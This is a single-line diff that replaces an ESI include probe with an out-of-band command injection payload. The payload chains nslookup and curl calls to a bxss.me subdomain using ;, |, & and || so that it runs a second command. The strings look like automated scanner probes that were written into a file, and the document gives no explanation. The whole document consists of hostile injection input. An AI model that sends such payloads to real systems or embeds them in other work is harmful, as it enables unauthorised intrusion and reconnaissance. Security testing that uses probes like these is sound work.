@@ -1,1 +1,1 @@
-555<esi:include src="http://bxss.me/rpb.png"/>
+;(nslookup -q=cname hitnskppmafnyc4ee9.bxss.me||curl hitnskppmafnyc4ee9.bxss.me)|(nslookup -q=cname hitnskppmafnyc4ee9.bxss.me||curl hitnskppmafnyc4ee9.bxss.me)&(nslookup -q=cname hitnskppmafnyc4ee9.bxss.me||curl hitnskppmafnyc4ee9.bxss.me)
